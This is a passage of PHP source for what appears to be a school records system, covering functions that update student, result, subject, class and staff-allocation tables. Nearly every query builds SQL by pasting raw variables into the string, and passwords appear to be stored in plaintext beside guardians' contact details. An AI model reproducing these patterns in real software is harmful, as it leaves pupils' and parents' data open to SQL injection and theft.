            echo "Result Data Modified";
          }
          else
          {
            echo "Result not modified";
          }

          $query2=mysqli_query(dbass::Connect(),"UPDATE cards set user='$nregno' where user='$oregno'");
          if($query2){
            echo "Cards Data Modified";
          }
          else
          {
            echo "Cards not modified";
          }

          $query3=mysqli_query(dbass::Connect(),"UPDATE fees set reg='$nregno' where reg='$oregno'");
          if($query3){
            echo "Fees Data Modified";
          }
          else
          {
            echo "Fees not modified";
          }


          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',status='$statuss',reg_id='$regid', names='$names', date_of_birth='$date_of_birth', lga='$lga', state='$state', country='$country', class='$class', date_admitted='$dateadmitted', session='$session' , password='$password', guardian='$guardian', g_email='$g_email', g_phone='$g_phone', date_graduated='$date_graduated', address='$address' where id='$id'");
          if($query){
            $news=true;

            }

          Activity::Add($_SESSION['userid'],"Students","Update Student"," $regno $names $class $date_admitted $session Data Updated",$session,$term);
        }
        else{
          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',status='$statuss',reg_id='$regid', names='$names', date_of_birth='$date_of_birth', lga='$lga', state='$state', country='$country', class='$class', date_admitted='$dateadmitted', session='$session' , password='$password', guardian='$guardian', g_email='$g_email', g_phone='$g_phone', date_graduated='$date_graduated', address='$address' where id='$id'");
          if($query){
            $news=true;
          }
        }
      }
      else
      {
        $news=false;
      }
      return $news;
    }

    public static function UpdateStudentp_kernel($id,$regid,$regno,$statuss,$names,$date_of_birth,$lga,$state,$country,$class,$dateadmitted,$session,$password,$guardian,$g_email,$g_phone,$date_graduated,$address){
      if(Module::IsStudentIdExistp($id))
      {

        $status=Module::IsStudentRegNoSamep($id,$regno);

        
        if($status['status']==true)
        {
          $nregno=$regno;
          $oregno=$status['oregno'];

          $query1=mysqli_query(dbass::Connect(),"UPDATE presult set reg_no='$nregno' where reg_no='$oregno'");
          if($query1){
            echo "Result Data Modified";
          }
          else
          {
            echo "Result not modified";
          }

          
          $query2=mysqli_query(dbass::Connect(),"UPDATE psession_statistical_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query2){
            echo "Session Statistical Analysis Data Modified";
          }
          else
          {
            echo "Session Statistical Analysis was not modified";
          }

          
          
          $query4=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query4){
            echo "Result Analysis Data was Modified";
          }
          else
          {
            echo "Result Analysis Data was not modified";
          }

          
          $query5=mysqli_query(dbass::Connect(),"UPDATE psubject_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query5){
            echo "Subject Analysis Data was Modified";
          }
          else
          {
            echo "Subject Analysis Data was not modified";
          }

          $query6=mysqli_query(dbass::Connect(),"UPDATE cards set user='$nregno' where user='$oregno'");
          if($query6){
            echo "Cards Data Modified";
          }
          else
          {
            echo "Cards not modified";
          }

          $query7=mysqli_query(dbass::Connect(),"UPDATE fees set reg='$nregno' where reg='$oregno'");
          if($query7){
            echo "Fees Data Modified";
          }
          else
          {
            echo "Fees not modified";
          }


          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',status='$statuss',reg_id='$regid', names='$names', date_of_birth='$date_of_birth', lga='$lga', state='$state', country='$country', class='$class', date_admitted='$dateadmitted', session='$session' , password='$password', guardian='$guardian', g_email='$g_email', g_phone='$g_phone', date_graduated='$date_graduated', address='$address' where id='$id'");
          if($query){
            $news=true;

            }

          Activity::Add($_SESSION['userid'],"Students","Update Student"," $regno $names $class $date_admitted $session Data Updated",$session,$term);
        }
        else{
          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',status='$statuss',reg_id='$regid', names='$names', date_of_birth='$date_of_birth', lga='$lga', state='$state', country='$country', class='$class', date_admitted='$dateadmitted', session='$session' , password='$password', guardian='$guardian', g_email='$g_email', g_phone='$g_phone', date_graduated='$date_graduated', address='$address' where id='$id'");
          if($query){
            $news=true;
          }
        }
      }
      else
      {
        $news=false;
      }
      return $news;
    }

    public static function UpdateStudentp_kernel_id($id,$regid,$regno){
      if(Module::IsStudentIdExistp($id))
      {

        $status=Module::IsStudentRegNoSamep($id,$regno);

        
        if($status['status']==true)
        {
          $nregno=$regno;
          $oregno=$status['oregno'];

          $query1=mysqli_query(dbass::Connect(),"UPDATE presult set reg_no='$nregno' where reg_no='$oregno'");
          if($query1){
            echo "Result Data Modified";
          }
          else
          {
            echo "Result not modified";
          }

          
          $query2=mysqli_query(dbass::Connect(),"UPDATE psession_statistical_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query2){
            echo "Session Statistical Analysis Data Modified";
          }
          else
          {
            echo "Session Statistical Analysis was not modified";
          }

          
          
          $query4=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query4){
            echo "Result Analysis Data was Modified";
          }
          else
          {
            echo "Result Analysis Data was not modified";
          }

          
          $query5=mysqli_query(dbass::Connect(),"UPDATE psubject_analysis set reg_no='$nregno' where reg_no='$oregno'");
          if($query5){
            echo "Subject Analysis Data was Modified";
          }
          else
          {
            echo "Subject Analysis Data was not modified";
          }

          $query6=mysqli_query(dbass::Connect(),"UPDATE cards set user='$nregno' where user='$oregno'");
          if($query6){
            echo "Cards Data Modified";
          }
          else
          {
            echo "Cards not modified";
          }

          $query7=mysqli_query(dbass::Connect(),"UPDATE fees set reg='$nregno' where reg='$oregno'");
          if($query7){
            echo "Fees Data Modified";
          }
          else
          {
            echo "Fees not modified";
          }


          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',reg_id='$regid' where id='$id'");
          if($query){
            $news=true;

            }

          Activity::Add($_SESSION['userid'],"Students","Update Student"," $regno $names $class $date_admitted $session Data Updated",$session,$term);
        }
        else{
          $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',reg_id='$regid' where id='$id'");
          if($query){
            $news=true;
          }
        }
      }
      else
      {
        $news=false;
      }
      return $news;
    }


    public static function IsStudentScoreExist($student,$subject,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and subject='$subject' and session='$session' and term='$term'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }
    /*
    public static function CleanAllEntryp($session,$term)
    {
      $Subjects=Module::ReadAllSubjectsp();
      $Students=Module::ReadAllStudentsp();

      foreach($Subjects as $Subject)
      {
        echo "<div style='color:blue'>".$Subject;
        foreach($Students as $Student)
        {
          if(Module::IsStudentScoreExist($Student,$Subject,$session,$term)>1)
          {
            if(Module::CleanEntryp($Student,$Subject,$session,$term))
            {
              echo "<p style='color:red'>".$Student."</p>";
              $data=$data." $regno : $subject : $session : $term";
            }
          }          
        }
      }
    }


    public static function CleanEntryp($regno,$subject,$session,$term){

      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$regno' and session='$session' and term='$term' and subject='$subject'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
        $query3=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no='$regno' and subject='$subject' and session='$session' and term='$term'");
        if($query3)
        {
          $rs=true;
        }
        else
        {
          $rs=false;
        }
      }
      
      return $rs;
    }
    */
    public static function CleanResultp(){


      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no=''  or subject='' or session='' or class='' or reg_no='undefined'  or subject='undefined' or session='undefined' or class='undefined' or reg_no is null  or subject is null or session is null or class is null ");
      $res1=mysqli_num_rows($query);
      if($res1>0)
      {

        $data="$res1 bugs found";

        $query1=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no=''  or subject='' or session='' or class='' or reg_no='undefined'  or subject='undefined' or session='undefined' or class='undefined' or reg_no is null  or subject is null or session is null or class is null ");

        if($query1)
        {
          $data=$data." and was cleaned successfully";
        }
        else{
          $data=$data." but was not cleaned successfully";
        }
      }
      else
      {
        $data="No bug was found";
      }

      return $data;
    }

    public static function CleanResultAnalysisp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where reg_no=''   or session='' or class='' or term='' or reg_no is null   or session is null or class is null or term is null ");
      $res1=mysqli_num_rows($query);
      if($res1>0)
      {

        $data="$res1 bugs found";

        $query1=mysqli_query(dbass::Connect(),"DELETE from presult_analysis where reg_no='' or  session='' or class='' or reg_no is null or session is null or class is null ");

        if($query1)
        {
          $data=$data." and was cleaned successfully";
        }
        else{
          $data=$data." but was not cleaned successfully";
        }
      }
      else
      {
        $data="No bug was found";
      }

      echo Module::CleanResultp();

      return $data;
    }

    public static function IsStudentScoreExistp($student,$subject,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and subject='$subject' and session='$session' and term='$term' and class='$class'");

        $res=mysqli_num_rows($query);
        
        if($res==0)
        {
            $rs=false;
        }
        elseif($res==1)
        {
          $rs=true;
        }
        elseif($res>1)
        {
          if(Module::DeleteSubjectResultp($student,$subject,$session,$term,$class))
          {
            echo "$student $subject Result exist in multiple places but resolved Successfully";
          }
          else
          {
            echo "$student $subject Result was not Deleted Successfully";
          }
        }
        
        return $rs;
    }

    public static function Sync_IsStudentScoreExistp($student,$subject,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from sync_presult where reg_no='$student' and subject='$subject' and session='$session' and term='$term' and class='$class'");

        $res=mysqli_num_rows($query);
        
        if($res==0)
        {
            $rs=false;
        }
        elseif($res==1)
        {
          $rs=true;
        }
        elseif($res>1)
        {
          if(Module::Sync_DeleteSubjectResultp($student,$subject,$session,$term,$class))
          {
            echo "$student $subject Result exist in multiple places but resolved Successfully";
          }
          else
          {
            echo "$student $subject Result was not Deleted Successfully";
          }
        }
        
        return $rs;
    }

    public static function DeleteSubjectResultp($student,$subject,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no='$student' and subject='$subject' and session='$session' and term='$term' and class='$class'");
        
        if($query>0)
        {
            $rs=true;
        }
        else
        {
          $rs=false;
        }
        
        return $rs;
    }

    public static function Sync_DeleteSubjectResultp($student,$subject,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"DELETE from sync_presult where reg_no='$student' and subject='$subject' and session='$session' and term='$term' and class='$class'");
        
        if($query>0)
        {
            $rs=true;
        }
        else
        {
          $rs=false;
        }
        
        return $rs;
    }



    public static function GetTotalStudents($session,$class){
        $query=mysqli_query(dbass::Connect(),"select * from students where session='$session' and class='$class'");
        $news=mysqli_num_rows($query);
        
        return $news;
    }

    public static function GetTotalStudentsp($session,$class){

      
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where session='$session' and class='$class'");
      $news=mysqli_num_rows($query);
      
      return $news;
    }

    public static function ReadStudentRegisteredSubjects($student,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and session='$session' and term='$term' order by subject ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(Module::IsSubjectExistp($res['subject']))
          {
            if(!in_array($res['subject'], $news))
              array_push($news, $res['subject']);
          }
          
        }
        
        return $news;
    }

    //Read all the sessions in students list
    public static function ReadStudentsSessions(){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents order by session ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          $year=date('Y');
          $max_year=$year-7;

          $session_part=explode("/", $res['session']);
          if(!($session_part[0]>$max_year))
          {
            if(!in_array($res['session'], $news)){
              array_push($news, $res['session']);
            }
          }          
        }
        
        return $news;
    }

    public static function ReadStudentSessionSubjects($student,$session){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student' and session='$session'  order by session ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!in_array($res['subject'], $news))
            array_push($news, $res['subject']);
        }
        
        return $news;
    }

    public static function ReadStudentSessionsp($student){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student'  order by session ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
          if(!in_array($res['session'], $news))
            array_push($news, $res['session']);
        }
        
        return $news;
    }

    public static function ReadStudentSessionDetailsp($student,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$student'  order by session ");
        while($res=mysqli_fetch_array($query))
        {
           $news['session']=$res['session'];
           $news['term']=$res['term'];
           $news['reg_no']=$res['reg_no'];
           $news['class']=$res['class'];
        }
        
        return $news['class'];
    }

    public static function GetClass($student)
    {

      $currentsession=Module::ReadCurrentSession();

      $year=substr($student, 0,4);
      $sessionyear=substr($currentsession['session'], 0,4);

      $class=$sessionyear-$year;
      if($class==0)
      {
        $class=1;
      }

      if($class==1)
      {
        $cls="JSS 1";
      }
      elseif($class==2)
      {
        $cls="JSS 2";
      }
      elseif($class==3)
      {
        $cls="JSS 3";
      }
      elseif($class==4)
      {
        $cls="SS 1";
      }
      elseif($class==5)
      {
        $cls="SS 2";
      }
      elseif($class==6)
      {
        $cls="SS 3";
      }
      return $cls;
    }

    public static function GetStudentClass($student)
    {

      $year=explode("/", $student);
      $cursession=Module::ReadCurrentSession();
      $currentyear=explode("/", $cursession['session']);
      $num=substr($student, 9,1);

      if($num>0)
      {
        $yc=$currentyear[0]-$year[1];
      }
      else
      {
        $yc=$currentyear[0]-$year[1];        
      }

      $class=Module::ReadYCClass($yc);
      return $class;
    }

    public static function GetClassp($student)
    {

      $currentsession=Module::ReadCurrentSession();
      $year=substr($student, 0,4);
      $sessionyear=substr($currentsession['session'], 0,4);
      $classtoken=substr($student, 4,1);
      $class=$sessionyear-$year+1;
      if($class==0)
      {
        $class=1;
      }

      if($class==1)
      {
        $cls="Prenursery 1";
      }
      elseif($class==2)
      {
        $cls="Prenursery 2";
      }
      elseif($class==3)
      {
        $cls="Nursery 1";
      }
      elseif($class==4)
      {
        $cls="Nursery 2";
      }
      elseif($class==5)
      {
        $cls="Nursery 3";
      }
      elseif($class==6)
      {
        $cls="Basic 1";
      }
      elseif($class==7)
      {
        $cls="Basic 2";
      }
      elseif($class==8)
      {
        $cls="Basic 3";
      }
      elseif($class==9)
      {
        $cls="Basic 4";
      }
      elseif($class==10)
      {
        $cls="Basic 5";
      }
      
      return $cls;
    }


    public static function ReadStudentDetails($regno){
        $query=mysqli_query(dbass::Connect(),"SELECT * from students where reg_no='$regno'  ");
        
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['regno']=$res['reg_no'];
          $news['regid']=$res['reg_id'];
          $news['names']=$res['names'];
          $news['dateadmitted']=$res['date_admitted'];
          $news['class']=Module::GetClass($regno);
          $news['password']=$res['password'];
          $news['session']=$res['session'];

        }
        
        return $news;
    }


    public static function ReadStudentDetailsp($regno){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where reg_no='$regno' or id='$regno' ");
        
        while($res=mysqli_fetch_array($query))
        {
          $news['regno']=$res['reg_no'];
          $news['id']=$res['id'];
          $news['regid']=$res['reg_id'];
          $news['status']=$res['status'];
          $news['names']=$res['names'];
          $news['date_of_birth']=$res['date_of_birth'];
          $news['lga']=$res['lga'];
          $news['state']=$res['state'];
          $news['country']=$res['country'];
          $news['g_email']=$res['g_email'];
          $news['g_phone']=$res['g_phone'];
          $news['guardian']=$res['guardian'];
          $news['address']=$res['address'];
          $news['date_admitted']=$res['date_admitted'];
          $news['date_graduated']=$res['date_graduated'];
          $news['class']=Module::GetStudentClass($regno); 

          $news['password']=$res['password'];
          $news['passport']=$res['passport'];
          $news['session']=$res['session'];
          $news['timestamp']=$res['timestamp'];

        }
        
        return $news;
    }


    public static function ReadParentDetailsp($phone,$email){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where g_phone='$phone'");
        
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['names']=$res['guardian'];
          $news['lga']=$res['lga'];
          $news['state']=$res['state'];
          $news['country']=$res['country'];
          $news['email']=$res['g_email'];
          $news['phone']=$res['g_phone'];
          $news['address']=$res['address']; 

          $news['password']=$res['password'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

  public static function ReadParentWards($g_phone,$g_email){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where g_phone='$g_phone'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['reg_no'], $news)){
            array_push($news, $res['reg_no']);
          }
      }
      
      return $news;
  }


    public static function ReadStudentResult($regno,$subject,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from result where reg_no='$regno' and subject='$subject' and session='$session' and term='$term' ");
        
        while($res=mysqli_fetch_array($query))
        {
          $news['regno']=$res['reg_no'];
          $news['subject']=$res['subject'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['ca1']=$res['ca_1'];
          $news['ca2']=$res['ca_2'];
          $news['ca3']=$res['ca_3'];
          $news['exam']=$res['exam'];
          $news['position']=$res['position'];
          $news['teacherRemark']=$res['teacher_remark'];
          $news['grade']=$res['grad_e'];
          $news['remark']=$res['remark'];
        }
        
        return $news;
    }


    public static function ReadStudentResultp($regno,$subject,$session,$term){


        $query=mysqli_query(dbass::Connect(),"SELECT * FROM presult where reg_no='$regno' and subject='$subject' and session='$session' and term='$term' ");
        
        while($res=mysqli_fetch_array($query))
        {
          $news['regno']=$res['reg_no'];
          $news['subject']=$res['subject'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['ca1']=$res['ca_1'];
          $news['ca2']=$res['ca_2'];
          $news['ca3']=$res['ca_3'];
          $news['ca_total']=$res['ca_total'];
          $news['exam']=$res['exam'];
          $news['total']=$res['total'];
          $news['position']=$res['position'];
          $news['teacherRemark']=$res['teacher_remark'];
          $news['grade']=$res['grad_e'];
          $news['remark']=$res['remark'];
          $news['comment']=$res['comment'];
        }
        
        return $news;
    }
    //Students Modules Ends

    //Subject Module Starts
    public static function IsSubjectExist($subject){
        $query=mysqli_query(dbass::Connect(),"select * from subjects where subject='$subject'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsSubjectExistp($subject){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where subject='$subject' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsClassExistp($class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from classes where class='$class' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsClassAllocatedToStaffp($staff,$class,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where class='$class' and staff_id='$staff' and session='$session' and term='$term' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsSubjectAllocatedToStaffp($staff,$class,$session,$term,$subject){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where class='$class' and staff_id='$staff' and session='$session' and term='$term' and subject='$subject' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=true;
        }
        
        return $rs;
    }

    public static function ReadStaffSubjectAllocation($staff,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where staff_id='$staff' and session='$session' and term='$term' and class='$class'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(Module::IsSubjectExistp($res['subject']))
        {
          if(!in_array($res['subject'], $news)){
              array_push($news,$res['subject']);
          }
        }
      }
      return $news;
    }

    public static function ReadStaffClassAllocation($staff,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where staff_id='$staff' and session='$session' and term='$term'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['class'], $news)){
            array_push($news,$res['class']);
        }
      }
      return $news;
    }

    public static function ReadFormMasterClassAllocation($staff,$session,$term){
      $query1=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where staff_id='$staff' and session='$session' and term='$term'");
      $news=array();
      while($res=mysqli_fetch_array($query1))
      {
        if(!in_array($res['class'], $news)){
            array_push($news,$res['class']);
        }
      }

      $query2=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where staff_id='$staff' and session='$session' and term='$term'");
      while($res1=mysqli_fetch_array($query2))
      {
        if(!in_array($res['class'], $news)){
            array_push($news,$res1['class']);
        }
      }

      return $news;
    }

    public static function IsClassFormMaster($staff,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where staff_id='$staff' and session='$session' and term='$term' and class='$class' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsSubject4Class($class,$subject){
        $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where `class`='$class' and subject='$subject'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsFormMaster($staff,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where staff_id='$staff' and session='$session' and term='$term' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsClassIdExistp($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from classes where id='$id' ");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsSubjectIdExistp($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function IsSubjectIdExist($id){
        $query=mysqli_query(dbass::Connect(),"select * from subjects where id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function IsAllocationExistp($class,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where class='$class' and session='$session' and term='$term' and class='$class'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }



    public static function IsAllocationExist($subject,$session,$term,$class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where subject='$subject' and session='$session' and term='$term' and class='$class'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function IsAllocationIdExist($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where  id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function IsAllocationIdExistp($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from pclass_allocation where  id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function IsSubjectAllocationIdExistp($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from subject_allocation where  id='$id'");

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }


    public static function AddAllocation($teacher,$subject,$class,$session,$term,$level){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into subject_allocation(staff_id,subject,class,session,term,level) values('$teacher','$subject','$class','$session','$term','$level')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }


    public static function AddAllocationp($teacher,$class,$session,$term){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into pclass_allocation(staff_id,class,session,term) values('$teacher','$class','$session','$term')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

                           
    public static function UpdateAllocation($id,$teacher,$subject,$class,$session,$term,$level){
      if(Module::IsAllocationIdExist($id))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE subject_allocation set staff_id='$teacher', subject='$subject', class='$class', session='$session',  term='$term', level='$level' where id='$id' ");
        if($query)
          $news=true;
        else
          $news=false;
      }
      else
      {
        $news=false;
      }

        return $news;
    }


    public static function UpdateAllocationp($id,$teacher,$class,$session,$term){
      if(Module::IsAllocationIdExistp($id))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE pclass_allocation SET staff_id='$teacher',  class='$class', session='$session',  term='$term' where id='$id' ");
        if($query)
          $news=true;
        else
          $news=false;
      }
      else
      {
        $news=false;
      }

        return $news;
    }

    public static function AddSubject($subject,$shortcode,$level){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into subjects(subject,short_code,level) values('$subject','$shortcode','$level')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    public static function IsSubjectLibraryExistp($subject)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where subject='$subject'");
      $res=mysqli_num_rows($query);
      if($res>0)
        return true;
      else
        return false;
    }

    public static function IsSubjectLibraryIdExistp($id)
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from subject_library where id='$id'");
      $res=mysqli_num_rows($query);
      if($res>0)
        return true;
      else
        return false;
    }

    public static function AddSubjectp($subject,$shortcode){
      if(!Module::IsSubjectLibraryExistp($subject))
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into subject_library(subject,sub_code) values('$subject','$shortcode')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }
      }     

      return $news;
    }

    public static function UpdateSubject($id,$osubject,$subject,$shortcode,$level){
      if(Module::IsSubjectIdExist($id))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE subjects set subject='$subject', short_code='$shortcode', level='$level' where id='$id'");
        if($query){
          $query1=mysqli_query(dbass::Connect(),"UPDATE result set subject='$subject' where subject='$osubject' and  level='$level'");

          $query2=mysqli_query(dbass::Connect(),"UPDATE subject_allocation set subject='$subject' where subject='$osubject' and  level='$level'");

          if($query1)
          {
            echo "Result subject schanged<br/>";
          }

          if($query2)
          {
            echo "Allocation subject schanged";
          }

            $news=true;
        }
        else
          $news=false;
      }
      else
      {
        $news=false;
      }

        return $news;
    }

    public static function UpdateResultSubjectsp($osubject,$subject){
        $query=mysqli_query(dbass::Connect(),"UPDATE presult set subject='$subject' where subject='$osubject'");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        } 

      return $news;
    }

    public static function UpdateSubjectSubjectsp($osubject,$subject,$short_code){
        $query=mysqli_query(dbass::Connect(),"UPDATE psubjects set subject='$subject', short_code='$short_code' where subject='$osubject'");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        } 

      return $news;
    }

    public static function UpdateSubjectsDatap($osubject,$subject,$shortcode){
        $query=mysqli_query(dbass::Connect(),"UPDATE subject_library set subject='$subject', sub_code='$shortcode' where subject='$osubject'");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        } 

      return $news;
    }

    public static function UpdateSubjectp($osubject,$subject,$shortcode){
      if(Module::UpdateResultSubjectsp($osubject,$subject))
      {
        echo "Result's Subject Modified Successfully";
      }
      else
      {
        echo "Result's Subject was not Modified Successfully";
      }

      if(Module::UpdateSubjectSubjectsp($osubject,$subject,$shortcode))
      {
        echo "Subject's Subject Modified Successfully";
      }
      else
      {
        echo "Subject's Subject was not Modified Successfully";
      }

      if(Module::UpdateSubjectsDatap($osubject,$subject,$shortcode))
      {
        echo "Subject Data's Subject Modified Successfully";
      }
      else
      {
        echo "Subject Data's Subject was not Modified Successfully";
      }
    }

  public static function UpdateSubjectClassp($oclass,$class){
      $query=mysqli_query(dbass::Connect(),"UPDATE psubjects set class='$class' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateResultClassp($oclass,$class){
      $query=mysqli_query(dbass::Connect(),"UPDATE presult set class='$class' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateStudentsClassp($oclass,$class){
      $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set class='$class' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateClassAllocationClassp($oclass,$class){
      $query=mysqli_query(dbass::Connect(),"UPDATE pclass_allocation set class='$class' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateResultAnalysisClassp($oclass,$class){
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set class='$class' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateClassesClassp($oclass,$class,$yc,$level){
      $query=mysqli_query(dbass::Connect(),"UPDATE classes set class='$class', yc='$yc', level='$level' where class='$oclass'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateClassp($oclass,$class,$yc,$level){
    if(Module::UpdateSubjectClassp($oclass,$class))
    {
      echo "Class Modified in Subject<br/>";
    }
    else
    {
      echo "Class not Modified in Subject<br/>";
    }
    
    if(Module::UpdateResultClassp($oclass,$class))
    {
      echo "Class Modified in Result<br/>";
    }
    else
    {
      echo "Class not Modified in Result<br/>";
    }

    if(Module::UpdateClassAllocationClassp($oclass,$class))
    {
      echo "Class Modified in Allocation<br/>";
    }
    else
    {
      echo "Class not Modified in Allocation<br/>";
    }

    if(Module::UpdateResultAnalysisClassp($oclass,$class))
    {
      echo "Class Modified in Result Analysis<br/>";
    }
    else
    {
      echo "Class not Modified in Result Analysis<br/>";
    }

    if(Module::UpdateClassesClassp($oclass,$class,$yc,$level))
    {
      echo "Class Modified in Classes<br/>";
    }
    else
    {
      echo "Class not Modified in Classes<br/>";
    }

    if(Module::UpdateStudentsClassp($oclass,$class))      
    {
      echo "Class Modified in Student<br/>";
    }
    else
    {
      echo "Class not Modified in Student<br/>";
    }
  }

  public static function ReadAllSubjects(){
